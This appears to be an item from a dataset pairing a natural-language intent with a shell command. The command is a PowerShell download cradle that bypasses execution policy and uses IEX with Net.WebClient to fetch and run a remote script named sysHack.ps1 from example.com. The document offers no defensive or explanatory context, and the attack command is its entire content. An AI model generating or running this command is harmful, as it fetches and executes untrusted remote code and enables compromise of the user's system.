# Natural language intent:
# Download and execute a PowerShell script from a remote URL.

powershell.exe -ExecutionPolicy Bypass -NoProfile -NoLogo -NonInteractive -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/sysHack.ps1')"
